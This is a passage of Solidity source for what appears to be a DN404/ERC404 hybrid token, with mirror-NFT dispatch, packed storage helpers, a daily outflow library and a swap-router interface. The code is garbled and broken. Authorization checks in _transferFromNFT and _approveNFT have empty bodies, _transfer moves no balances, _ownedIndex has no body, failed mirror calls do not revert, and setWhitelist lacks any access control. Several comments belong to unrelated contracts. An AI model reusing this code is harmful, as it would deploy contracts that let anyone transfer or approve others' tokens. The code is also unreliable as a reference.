NFTs if balance after transfer is less than\r\n    /// the amount required to support the current NFT balance.\r\n    ///\r\n    /// Will mint NFTs to `to` if the recipient's new balance supports\r\n    /// additional NFTs ***AND*** the `to` address's skipNFT flag is\r\n    /// set to false.\r\n    ///\r\n    /// Emits a {Transfer} event.\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {\r\n\r\n        DN404Storage storage $ = _getDN404Storage();\r\n\r\n        AddressData storage fromAddressData = _addressData(from);\r\n        AddressData storage toAddressData = _addressData(to);\r\n\r\n        _TransferTemps memory t;\r\n        t.fromOwnedLength = fromAddressData.ownedLength;\r\n        t.toOwnedLength = toAddressData.ownedLength;\r\n        t.fromBalance = fromAddressData.balance;\r\n\r\n\r\n        \r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    /// @dev Transfers token `id` from `from` to `to`.\r\n    ///\r\n    /// Requirements:\r\n    ///\r\n    /// - Call must originate from the mirror contract.\r\n    /// - Token `id` must exist.\r\n    /// - `from` must be the owner of the token.\r\n    /// - `to` cannot be the zero address.\r\n    ///   `msgSender` must be the owner of the token, or be approved to manage the token.\r\n    ///\r\n    /// Emits a {Transfer} event.\r\n    function _transferFromNFT(address from, address to, uint256 id, address msgSender)\r\n        internal\r\n        virtual\r\n    {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n\r\n\r\n        address owner = $.aliasToAddress[_get($.oo, _ownershipIndex(id))];\r\n\r\n\r\n        if (msgSender != from) {\r\n            if (!$.operatorApprovals[from][msgSender]) {\r\n                if (msgSender != $.tokenApprovals[id]) {\r\n                }\r\n            }\r\n        }\r\n\r\n        AddressData storage fromAddressData = _addressData(from);\r\n        AddressData storage toAddressData = _addressData(to);\r\n\r\n        fromAddressData.balance -= uint96(_WAD);\r\n\r\n        \r\n\r\n        emit Transfer(from, to, _WAD);\r\n    }\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                 DATA HITCHHIKING FUNCTIONS                 */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Returns the auxiliary data for `owner`.\r\n    /// Minting, transferring, burning the tokens of `owner` will not change the auxiliary data.\r\n    /// Auxiliary data can be set for any address, even if it does not have any tokens.\r\n    function _getAux(address owner) internal view virtual returns (uint88) {\r\n        return _getDN404Storage().addressData[owner].aux;\r\n    }\r\n\r\n    /// @dev Set the auxiliary data for `owner` to `value`.\r\n    /// Minting, transferring, burning the tokens of `owner` will not change the auxiliary data.\r\n    /// Auxiliary data can be set for any address, even if it does not have any tokens.\r\n    function _setAux(address owner, uint88 value) internal virtual {\r\n        _getDN404Storage().addressData[owner].aux = value;\r\n    }\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                     SKIP NFT FUNCTIONS                     */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Returns true if account `a` will skip NFT minting on token mints and transfers.\r\n    /// Returns false if account `a` will mint NFTs on token mints and transfers.\r\n    function getSkipNFT(address a) public view virtual returns (bool) {\r\n        AddressData storage d = _getDN404Storage().addressData[a];\r\n        if (d.flags & _ADDRESS_DATA_INITIALIZED_FLAG == 0) return _hasCode(a);\r\n        return d.flags & _ADDRESS_DATA_SKIP_NFT_FLAG != 0;\r\n    }\r\n\r\n    /// @dev Sets the caller's skipNFT flag to `skipNFT`\r\n    ///\r\n    /// Emits a {SkipNFTSet} event.\r\n    function setSkipNFT(bool skipNFT) public virtual {\r\n        _setSkipNFT(msg.sender, skipNFT);\r\n    }\r\n\r\n    /// @dev Internal function to set account `a` skipNFT flag to `state`\r\n    ///\r\n    /// Initializes account `a` AddressData if it is not currently initialized.\r\n    ///\r\n    /// Emits a {SkipNFTSet} event.\r\n    function _setSkipNFT(address a, bool state) internal virtual {\r\n        AddressData storage d = _addressData(a);\r\n        if ((d.flags & _ADDRESS_DATA_SKIP_NFT_FLAG != 0) != state) {\r\n            d.flags ^= _ADDRESS_DATA_SKIP_NFT_FLAG;\r\n        }\r\n        emit SkipNFTSet(a, state);\r\n    }\r\n\r\n    /// @dev Returns a storage data pointer for account `a` AddressData\r\n    ///\r\n    /// Initializes account `a` AddressData if it is not currently initialized.\r\n    function _addressData(address a) internal virtual returns (AddressData storage d) {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n        d = $.addressData[a];\r\n\r\n        if (d.flags & _ADDRESS_DATA_INITIALIZED_FLAG == 0) {\r\n            uint8 flags = _ADDRESS_DATA_INITIALIZED_FLAG;\r\n            if (_hasCode(a)) flags |= _ADDRESS_DATA_SKIP_NFT_FLAG;\r\n            d.flags = flags;\r\n        }\r\n    }\r\n\r\n    /// @dev Returns the `addressAlias` of account `to`.\r\n    ///\r\n    /// Assigns and registers the next alias if `to` alias was not previously registered.\r\n    function _registerAndResolveAlias(AddressData storage toAddressData, address to)\r\n        internal\r\n        virtual\r\n        returns (uint32 addressAlias)\r\n    {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n        addressAlias = toAddressData.addressAlias;\r\n        if (addressAlias == 0) {\r\n            addressAlias = ++$.numAliases;\r\n            toAddressData.addressAlias = addressAlias;\r\n            $.aliasToAddress[addressAlias] = to;\r\n        }\r\n    }\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                     MIRROR OPERATIONS                      */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Returns the address of the mirror NFT contract.\r\n    function mirrorERC721() public view virtual returns (address) {\r\n        return _getDN404Storage().mirrorERC721;\r\n    }\r\n\r\n    /// @dev Returns the total NFT supply.\r\n    function _totalNFTSupply() internal view virtual returns (uint256) {\r\n        return _getDN404Storage().totalNFTSupply;\r\n    }\r\n\r\n    /// @dev Returns `owner` NFT balance.\r\n    function _balanceOfNFT(address owner) internal view virtual returns (uint256) {\r\n        return _getDN404Storage().addressData[owner].ownedLength;\r\n    }\r\n\r\n    /// @dev Returns the owner of token `id`.\r\n    function _ownerAt(uint256 id) internal view virtual returns (address) {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n        return $.aliasToAddress[_get($.oo, _ownershipIndex(id))];\r\n    }\r\n\r\n    /// @dev Returns the owner of token `id`.\r\n    ///\r\n    /// Requirements:\r\n    /// - Token `id` must exist.\r\n    function _ownerOf(uint256 id) internal view virtual returns (address) {\r\n        return _ownerAt(id);\r\n    }\r\n\r\n    /// @dev Returns if token `id` exists.\r\n    function _exists(uint256 id) internal view virtual returns (bool) {\r\n        return _ownerAt(id) != address(0);\r\n    }\r\n\r\n    /// @dev Returns the account approved to manage token `id`.\r\n    ///\r\n    /// Requirements:\r\n    /// - Token `id` must exist.\r\n    function _getApproved(uint256 id) internal view virtual returns (address) {\r\n        return _getDN404Storage().tokenApprovals[id];\r\n    }\r\n\r\n    /// @dev Sets `spender` as the approved account to manage token `id`, using `msgSender`.\r\n    ///\r\n    /// Requirements:\r\n    /// - `msgSender` must be the owner or an approved operator for the token owner.\r\n    function _approveNFT(address spender, uint256 id, address msgSender)\r\n        internal\r\n        virtual\r\n        returns (address)\r\n    {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n\r\n        address owner = $.aliasToAddress[_get($.oo, _ownershipIndex(id))];\r\n\r\n        if (msgSender != owner) {\r\n            if (!$.operatorApprovals[owner][msgSender]) {\r\n            }\r\n        }\r\n\r\n        $.tokenApprovals[id] = spender;\r\n\r\n        return owner;\r\n    }\r\n\r\n    /// @dev Approve or remove the `operator` as an operator for `msgSender`,\r\n    /// without authorization checks.\r\n    function _setApprovalForAll(address operator, bool approved, address msgSender)\r\n        internal\r\n        virtual\r\n    {\r\n        _getDN404Storage().operatorApprovals[msgSender][operator] = approved;\r\n    }\r\n\r\n    /// @dev Calls the mirror contract to link it to this contract.\r\n    ///\r\n    function _linkMirrorContract(address mirror) internal virtual {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            mstore(0x00, 0x0f4599e5) // `linkMirrorContract(address)`.\r\n            mstore(0x20, caller())\r\n            if iszero(and(eq(mload(0x00), 1), call(gas(), mirror, 0, 0x1c, 0x24, 0x00, 0x20))) {\r\n                mstore(0x00, 0xd125259c) // `LinkMirrorContractFailed()`.\r\n            }\r\n        }\r\n    }\r\n\r\n    /// @dev Fallback modifier to dispatch calls from the mirror NFT contract\r\n    /// to internal functions in this contract.\r\n    modifier dn404Fallback() virtual {\r\n        DN404Storage storage $ = _getDN404Storage();\r\n\r\n        uint256 fnSelector = _calldataload(0x00) >> 224;\r\n\r\n        // `isApprovedForAll(address,address)`.\r\n        if (fnSelector == 0xe985e9c5) {\r\n\r\n            address owner = address(uint160(_calldataload(0x04)));\r\n            address operator = address(uint160(_calldataload(0x24)));\r\n\r\n            _return($.operatorApprovals[owner][operator] ? 1 : 0);\r\n        }\r\n        // `ownerOf(uint256)`.\r\n        if (fnSelector == 0x6352211e) {\r\n\r\n            uint256 id = _calldataload(0x04);\r\n\r\n            _return(uint160(_ownerOf(id)));\r\n        }\r\n        // `transferFromNFT(address,address,uint256,address)`.\r\n        if (fnSelector == 0xe5eb36c8) {\r\n\r\n            address from = address(uint160(_calldataload(0x04)));\r\n            address to = address(uint160(_calldataload(0x24)));\r\n            uint256 id = _calldataload(0x44);\r\n            address msgSender = address(uint160(_calldataload(0x64)));\r\n\r\n            _transferFromNFT(from, to, id, msgSender);\r\n            _return(1);\r\n        }\r\n        // `setApprovalForAll(address,bool,address)`.\r\n        if (fnSelector == 0x813500fc) {\r\n\r\n            address spender = address(uint160(_calldataload(0x04)));\r\n            bool status = _calldataload(0x24) != 0;\r\n            address msgSender = address(uint160(_calldataload(0x44)));\r\n\r\n            _setApprovalForAll(spender, status, msgSender);\r\n            _return(1);\r\n        }\r\n        // `approveNFT(address,uint256,address)`.\r\n        if (fnSelector == 0xd10b6e0c) {\r\n\r\n            address spender = address(uint160(_calldataload(0x04)));\r\n            uint256 id = _calldataload(0x24);\r\n            address msgSender = address(uint160(_calldataload(0x44)));\r\n\r\n            _return(uint160(_approveNFT(spender, id, msgSender)));\r\n        }\r\n        // `getApproved(uint256)`.\r\n        if (fnSelector == 0x081812fc) {\r\n\r\n            uint256 id = _calldataload(0x04);\r\n\r\n            _return(uint160(_getApproved(id)));\r\n        }\r\n        // `balanceOfNFT(address)`.\r\n        if (fnSelector == 0xf5b100ea) {\r\n\r\n            address owner = address(uint160(_calldataload(0x04)));\r\n\r\n            _return(_balanceOfNFT(owner));\r\n        }\r\n        // `totalNFTSupply()`.\r\n        if (fnSelector == 0xe2c79281) {\r\n\r\n            _return(_totalNFTSupply());\r\n        }\r\n        // `implementsDN404()`.\r\n        if (fnSelector == 0xb7a94eb8) {\r\n            _return(1);\r\n        }\r\n        _;\r\n    }\r\n\r\n    /// @dev Fallback function for calls from mirror NFT contract.\r\n    fallback() external payable virtual dn404Fallback {}\r\n\r\n    receive() external payable virtual {}\r\n\r\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\r\n    /*                      PRIVATE HELPERS                       */\r\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\r\n\r\n    /// @dev Struct containing packed log data for `Transfer` events to be\r\n    /// emitted by the mirror NFT contract.\r\n    struct _PackedLogs {\r\n        uint256[] logs;\r\n        uint256 offset;\r\n    }\r\n\r\n    /// @dev Initiates memory allocation for packed logs with `n` log items.\r\n    function _packedLogsMalloc(uint256 n) private pure returns (_PackedLogs memory p) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            let logs := add(mload(0x40), 0x40) // Offset by 2 words for `_packedLogsSend`.\r\n            mstore(logs, n)\r\n            let offset := add(0x20, logs)\r\n            mstore(0x40, add(offset, shl(5, n)))\r\n            mstore(p, logs)\r\n            mstore(add(0x20, p), offset)\r\n        }\r\n    }\r\n\r\n    /// @dev Adds a packed log item to `p` with address `a`, token `id` and burn flag `burnBit`.\r\n    function _packedLogsAppend(_PackedLogs memory p, address a, uint256 id, uint256 burnBit)\r\n        private\r\n        pure\r\n    {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            let offset := mload(add(0x20, p))\r\n            mstore(offset, or(or(shl(96, a), shl(8, id)), burnBit))\r\n            mstore(add(0x20, p), add(offset, 0x20))\r\n        }\r\n    }\r\n\r\n    /// @dev Calls the `mirror` NFT contract to emit Transfer events for packed logs `p`.\r\n    function _packedLogsSend(_PackedLogs memory p, address mirror) private {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            let logs := mload(p)\r\n            let o := sub(logs, 0x40) // Start of calldata to send.\r\n            mstore(o, 0x263c69d6) // `logTransfer(uint256[])`.\r\n            mstore(add(o, 0x20), 0x20) // Offset of `logs` in the calldata to send.\r\n            let n := add(0x44, shl(5, mload(logs))) // Length of calldata to send.\r\n            if iszero(and(eq(mload(o), 1), call(gas(), mirror, 0, add(o, 0x1c), n, o, 0x20))) {\r\n            }\r\n        }\r\n    }\r\n\r\n    /// @dev Struct of temporary variables for transfers.\r\n    struct _TransferTemps {\r\n        uint256 nftAmountToBurn;\r\n        uint256 nftAmountToMint;\r\n        uint256 fromBalance;\r\n        uint256 toBalance;\r\n        uint256 fromOwnedLength;\r\n        uint256 toOwnedLength;\r\n    }\r\n\r\n    /// @dev Returns if `a` has bytecode of non-zero length.\r\n    function _hasCode(address a) private view returns (bool result) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            result := extcodesize(a) // Can handle dirty upper bits.\r\n        }\r\n    }\r\n\r\n    /// @dev Returns the calldata value at `offset`.\r\n    function _calldataload(uint256 offset) private pure returns (uint256 value) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            value := calldataload(offset)\r\n        }\r\n    }\r\n\r\n    /// @dev Executes a return opcode to return `x` and end the current call frame.\r\n    function _return(uint256 x) private pure {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            mstore(0x00, x)\r\n            return(0x00, 0x20)\r\n        }\r\n    }\r\n\r\n    /// @dev Returns `max(0, x - y)`.\r\n    function _zeroFloorSub(uint256 x, uint256 y) private pure returns (uint256 z) {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            z := mul(gt(x, y), sub(x, y))\r\n        }\r\n    }\r\n\r\n    /// @dev Returns `i << 1`.\r\n    function _ownershipIndex(uint256 i) private pure returns (uint256) {\r\n        return i << 1;\r\n    }\r\n\r\n    /// @dev Returns `(i << 1) + 1`.\r\n    function _ownedIndex(uint256 i) private pure returns (uint256) {\r\n    }\r\n\r\n    /// @dev Returns the uint32 value at `index` in `map`.\r\n    function _get(Uint32Map storage map, uint256 index) private view returns (uint32 result) {\r\n        result = uint32(map.map[index >> 3] >> ((index & 7) << 5));\r\n    }\r\n\r\n    /// @dev Updates the uint32 value at `index` in `map`.\r\n    function _set(Uint32Map storage map, uint256 index, uint32 value) private {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            mstore(0x20, map.slot)\r\n            mstore(0x00, shr(3, index))\r\n            let s := keccak256(0x00, 0x40) // Storage slot.\r\n            let o := shl(5, and(index, 7)) // Storage slot offset (bits).\r\n            let v := sload(s) // Storage slot value.\r\n            let m := 0xffffffff // Value mask.\r\n            sstore(s, xor(v, shl(o, and(m, xor(shr(o, v), value)))))\r\n        }\r\n    }\r\n\r\n    /// @dev Sets the owner alias and the owned index together.\r\n    function _setOwnerAliasAndOwnedIndex(\r\n        Uint32Map storage map,\r\n        uint256 id,\r\n        uint32 ownership,\r\n        uint32 ownedIndex\r\n    ) private {\r\n        /// @solidity memory-safe-assembly\r\n        assembly {\r\n            let value := or(shl(32, ownedIndex), and(0xffffffff, ownership))\r\n            mstore(0x20, map.slot)\r\n            mstore(0x00, shr(2, id))\r\n            let s := keccak256(0x00, 0x40) // Storage slot.\r\n            let o := shl(6, and(id, 3)) // Storage slot offset (bits).\r\n            let v := sload(s) // Storage slot value.\r\n            let m := 0xffffffffffffffff // Value mask.\r\n            sstore(s, xor(v, shl(o, and(m, xor(shr(o, v), value)))))\r\n        }\r\n    }\r\n}\r\n\r\nlibrary DailyOutflowCounterLib {\r\n    uint256 internal constant WAD_TRUNCATED = 10 ** 18 >> 40;\r\n\r\n    uint256 internal constant OUTFLOW_TRUNCATED_MASK = 0xffffffffffffff;\r\n\r\n    uint256 internal constant DAY_BITPOS = 56;\r\n\r\n    uint256 internal constant DAY_MASK = 0x7fffffff;\r\n\r\n    uint256 internal constant OUTFLOW_TRUNCATE_SHR = 40;\r\n\r\n    uint256 internal constant WHITELISTED_BITPOS = 87;\r\n\r\n    function update(uint88 packed, uint256 outflow)\r\n        internal\r\n        view\r\n        returns (uint88 updated, uint256 multiple)\r\n    {\r\n      \r\n            if (isWhitelisted(packed)) {\r\n                return (packed, 0);\r\n            }\r\n\r\n            uint256 currentDay = (block.timestamp / 86400) & DAY_MASK;\r\n            uint256 packedDay = (uint256(packed) >> DAY_BITPOS) & DAY_MASK;\r\n            uint256 totalOutflowTruncated = uint256(packed) & OUTFLOW_TRUNCATED_MASK;\r\n\r\n            if (packedDay != currentDay) {\r\n                totalOutflowTruncated = 0;\r\n                packedDay = currentDay;\r\n            }\r\n\r\n            uint256 result = packedDay << DAY_BITPOS;\r\n            uint256 todaysOutflowTruncated =\r\n                totalOutflowTruncated + ((outflow >> OUTFLOW_TRUNCATE_SHR) & OUTFLOW_TRUNCATED_MASK);\r\n            result |= todaysOutflowTruncated & OUTFLOW_TRUNCATED_MASK;\r\n            updated = uint88(result);\r\n            multiple = todaysOutflowTruncated / WAD_TRUNCATED;\r\n        \r\n    }\r\n\r\n    function isWhitelisted(uint88 packed) internal pure returns (bool) {\r\n        return packed >> WHITELISTED_BITPOS != 0;\r\n    }\r\n\r\n    function setWhitelisted(uint88 packed, bool status) internal pure returns (uint88) {\r\n        if (isWhitelisted(packed) != status) {\r\n            packed ^= uint88(1 << WHITELISTED_BITPOS);\r\n        }\r\n        return packed;\r\n    }\r\n}\r\n\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\ninterface IERC404 {\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n}\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\ninterface Interfaces {\r\n    function createPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external returns (address pair);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n   \r\n    function getAmountsOut(\r\n        uint256 amountIn,\r\n        address[] memory path\r\n    ) external view returns (uint256[] memory amounts);\r\n\r\n    function getAmountsIn(\r\n        uint256 amountOut,\r\n        address[] calldata path\r\n    ) external view returns (uint256[] memory amounts);\r\n\r\n     function swapTokensForExactTokens(\r\n        uint256 amountOut,\r\n        uint256 amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint256[] memory amounts);\r\n\r\n    function swapExactETHForTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable returns (uint256[] memory amounts);\r\n\r\n}\r\n\r\nabstract contract ERC721Receiver {\r\n    function onERC721Received(\r\n        address,\r\n        address,\r\n        uint256,\r\n        bytes calldata\r\n    ) external virtual returns (bytes4) {\r\n        return ERC721Receiver.onERC721Received.selector;\r\n    }\r\n}\r\n\r\n\r\ncontract AERC404  {\r\n    // Events\r\n    event ERC20Transfer(\r\n        address indexed from,\r\n        address indexed to,\r\n        uint256 amount\r\n    );\r\n    event ERC721Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 indexed id\r\n    );\r\n    event ApprovalForAll(\r\n        address indexed owner,\r\n        address indexed operator,\r\n        bool approved\r\n    );\r\n\r\n\r\n\r\n    // Metadata\r\n    /// @dev Token name\r\n    string public name_ = \"\";\r\n\r\n    /// @dev Token symbol\r\n    string public symbol_ = \"\";\r\n\r\n    /// @dev Decimals for fractional representation\r\n    uint8 public immutable decimals_ = 10;\r\n\r\n    /// @dev Total supply in fractionalized representation\r\n    uint256 public immutable totalSupply_ = 100;\r\n\r\n    /// @dev Current mint counter, monotonically increasing to ensure accurate ownership\r\n    uint256 public minted;\r\n\r\n    // Mappings\r\n    /// @dev Balance of user in fractional representation\r\n    mapping(address => uint256) public balanceOf_;\r\n\r\n    /// @dev Allowance of user in fractional representation\r\n    mapping(address => mapping(address => uint256)) public allowance_;\r\n\r\n    /// @dev Approval in native representaion\r\n    mapping(uint256 => address) public getApproved;\r\n\r\n    /// @dev Approval for all in native representation\r\n    mapping(address => mapping(address => bool)) public isApprovedForAll;\r\n\r\n    /// @dev Owner of id in native representation\r\n    mapping(uint256 => address) internal _ownerOf;\r\n\r\n    /// @dev Array of owned ids in native representation\r\n    mapping(address => uint256[]) internal _owned;\r\n\r\n    /// @dev Tracks indices for the _owned mapping\r\n    mapping(uint256 => uint256) internal _ownedIndex;\r\n\r\n    /// @dev Addresses whitelisted from minting / burning for gas savings (pairs, routers, etc)\r\n    mapping(address => bool) public whitelist;\r\n\r\n    /// @notice Initialization function to set pairs / etc\r\n    ///         saving gas by avoiding mint / burn on unnecessary targets\r\n    function setWhitelist(address target, bool state) public {\r\n        whitelist[target] = state;\r\n    }\r\n\r\n    /// @notice Function to find owner of a given native token\r\n    function ownerOf(uint256 id) public view virtual returns (address owner) {\r\n        owner = _ownerOf[id];\r\n\r\n        if (owner == address(0)) {\r\n            revert();\r\n        }\r\n    }\r\n\r\n    /// @notice tokenURI must be implemented by child contract\r\n    function tokenURI(uint256 id) public view  returns (string memory){\r\n        return \"\";\r\n    }\r\n\r\n    /// @notice Function for token approvals\r\n    /// @dev This function assumes id / native if amount less than or equal to current max id\r\n    function approve_(\r\n        address spender,\r\n        uint256 amountOrId\r\n    ) public virtual returns (bool) {\r\n        if (amountOrId <= minted && amountOrId > 0) {\r\n            address owner = _ownerOf[amountOrId];\r\n\r\n            if (msg.sender != owner && !isApprovedForAll[owner][msg.sender]) {\r\n                revert();\r\n            }\r\n\r\n            getApproved[amountOrId] = spender;\r\n\r\n\r\n        } else {\r\n            allowance_[msg.sender][spender] = amountOrId;\r\n\r\n\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    /// @notice Function native approvals\r\n    function setApprovalForAll(address operator, bool approved) public virtual {\r\n        isApprovedForAll[msg.sender][operator] = approved;\r\n\r\n        emit ApprovalForAll(msg.sender, operator, approved);\r\n    }\r\n\r\n    /// @notice Function for mixed transfers\r\n    /// @dev This function assumes id / native if amount less than or equal to current max id\r\n    function transferFrom_(\r\n        address from,\r\n        address to,\r\n        uint256 amountOrId\r\n    ) public virtual {\r\n        if (amountOrId <= minted) {\r\n            if (from != _ownerOf[amountOrId]) {\r\n                revert ();\r\n            }\r\n\r\n            if (to == address(0)) {\r\n                revert ();\r\n            }\r\n\r\n            if (\r\n                msg.sender != from &&\r\n                !isApprovedForAll[from][msg.sender] &&\r\n                msg.sender != getApproved[amountOrId]\r\n            ) {\r\n                revert ();\r\n            }\r\n\r\n            balanceOf_[from] -= _getUnit();\r\n\r\n                balanceOf_[to] += _getUnit();\r\n\r\n            _ownerOf[amountOrId] = to;\r\n            delete getApproved[amountOrId];\r\n\r\n            // update _owned for sender\r\n            uint256 updatedId = _owned[from][_owned[from].length - 1];\r\n            _owned[from][_ownedIndex[amountOrId]] = updatedId;\r\n            // pop\r\n            _owned[from].pop();\r\n            // update index for the moved id\r\n            _ownedIndex[updatedId] = _ownedIndex[amountOrId];\r\n            // push token to to owned\r\n            _owned[to].push(amountOrId);\r\n            // update index for to owned\r\n            _ownedIndex[amountOrId] = _owned[to].length - 1;\r\n\r\n\r\n            emit ERC20Transfer(from, to, _getUnit());\r\n        } else {\r\n            uint256 allowed = allowance_[from][msg.sender];\r\n\r\n            if (allowed != type(uint256).max)\r\n                allowance_[from][msg.sender] = allowed - amountOrId;\r\n\r\n            _transfer_(from, to, amountOrId);\r\n        }\r\n    }\r\n\r\n    /// @notice Function for fractional transfers\r\n    function transfer_(\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        return _transfer_(msg.sender, to, amount);\r\n    }\r\n\r\n    /// @notice Function for native transfers with contract support\r\n    function safeTransferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 id\r\n    ) public virtual {\r\n        transferFrom_(from, to, id);\r\n\r\n        if (\r\n            ERC721Receiver(to).onERC721Received(msg.sender, from, id, \"\") !=\r\n            ERC721Receiver.onERC721Received.selector\r\n        ) {\r\n            revert ();\r\n        }\r\n    }\r\n\r\n    /// @notice Function for native transfers with contract support and callback data\r\n    function safeTransferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 id,\r\n        bytes calldata data\r\n    ) public virtual {\r\n        transferFrom_(from, to, id);\r\n\r\n        if (\r\n            ERC721Receiver(to).onERC721Received(msg.sender, from, id, data) !=\r\n            ERC721Receiver.onERC721Received.selector\r\n        ) {\r\n            revert ();\r\n        }\r\n    }\r\n\r\n    /// @notice Internal function for fractional transfers\r\n    function _transfer_(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual returns (bool) {\r\n        uint256 unit = _getUnit();\r\n        uint256 balanceBeforeSender = balanceOf_[from];\r\n        uint256 balanceBeforeReceiver = balanceOf_[to];\r\n\r\n        balanceOf_[from] -= amount;\r\n\r\n            balanceOf_[to] += amount;\r\n\r\n        // Skip burn for certain addresses to save gas\r\n        if (!whitelist[from]) {\r\n            uint256 tokens_to_burn = (balanceBeforeSender / unit) -\r\n                (balanceOf_[from] / unit);\r\n            for (uint256 i = 0; i < tokens_to_burn; i++) {\r\n                _burn(from);\r\n            }\r\n        }\r\n\r\n        // Skip minting for certain addresses to save gas\r\n        if (!whitelist[to]) {\r\n            uint256 tokens_to_mint = (balanceOf_[to] / unit) -\r\n                (balanceBeforeReceiver / unit);\r\n            for (uint256 i = 0; i < tokens_to_mint; i++) {\r\n                _mint(to);\r\n            }\r\n        }\r\n\r\n        emit ERC20Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    // Internal utility logic\r\n    function _getUnit() internal view returns (uint256) {\r\n        return 10 ** decimals_;\r\n    }\r\n\r\n    function _mint(address to) internal virtual {\r\n        if (to == address(0)) {\r\n            revert ();\r\n        }\r\n\r\n            minted++;\r\n\r\n        uint256 id = minted;\r\n\r\n        if (_ownerOf[id] != address(0)) {\r\n            revert ();\r\n        }\r\n\r\n        _ownerOf[id] = to;\r\n        